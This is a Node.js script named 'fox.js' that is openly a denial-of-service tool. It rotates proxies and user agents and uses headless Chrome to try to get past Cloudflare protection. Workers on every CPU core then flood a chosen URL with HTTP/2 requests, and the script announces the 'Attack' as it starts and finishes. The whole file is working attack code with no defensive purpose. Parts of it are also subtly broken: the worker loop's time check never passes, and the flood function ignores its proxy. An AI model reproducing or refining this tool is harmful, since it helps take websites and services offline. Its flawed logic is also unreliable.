const fs = require("fs");
const cluster = require("cluster");
const puppeteer = require("puppeteer");
const http2 = require("http2");
const http = require("http");
const crypto = require("crypto");
const tls = require("tls");
const url = require("url");

if (process.argv.length !== 4) {
    console.log("Usage: node fox.js <url> <time>");
    process.exit(1);
}

const target = process.argv[2];
const duration = parseInt(process.argv[3], 10) * 1000;

const proxies = fs.readFileSync("proxy.txt", "utf-8").split("\n").filter(Boolean);
const userAgents = fs.readFileSync("ua.txt", "utf-8").split("\n").filter(Boolean);

const bypassCloudflare = async (targetUrl, proxy) => {
    const browser = await puppeteer.launch({
        args: [`--proxy-server=http://${proxy}`, "--no-sandbox", "--disable-setuid-sandbox"],
        headless: true,
    });

    const page = await browser.newPage();

    try {
        await page.setUserAgent(userAgents[Math.floor(Math.random() * userAgents.length)]);
        await page.goto(targetUrl, { waitUntil: "domcontentloaded", timeout: 60000 });
        await browser.close();
    } catch (err) {
        await browser.close();
    }
};

const floodRequest = async (proxy) => {
    const parsedUrl = url.parse(target);
    const headers = {
        ":method": "GET",
        ":path": parsedUrl.path || "/",
        ":scheme": "https",
        ":authority": parsedUrl.host,
        "user-agent": userAgents[Math.floor(Math.random() * userAgents.length)],
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br",
        "connection": "keep-alive",
    };

    try {
        const client = http2.connect(target, {
            createConnection: () => tls.connect({
                host: parsedUrl.host,
                servername: parsedUrl.host,
                rejectUnauthorized: false,
                ALPNProtocols: ["h2"],
            }),
        });

        client.on("error", () => client.destroy());

        const req = client.request(headers);

        req.on("response", () => {
            req.close();
            client.destroy();
        });

        req.end();
    } catch (err) {}
};

if (cluster.isMaster) {
    console.log("🚀 Starting Attack...");
    console.log(`🔗 Target: ${target}`);
    console.log(`⏳ Duration: ${duration / 1000} seconds`);

    const numCPUs = require("os").cpus().length;
    for (let i = 0; i < numCPUs; i++) {
        cluster.fork();
    }

    setTimeout(() => {
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }
        console.log("✅ Attack Finished!");
    }, duration);
} else {
    (async () => {
        while (Date.now() < duration) {
            const proxy = proxies[Math.floor(Math.random() * proxies.length)];
            await bypassCloudflare(target, proxy);
            floodRequest(proxy);
        }
    })();
}
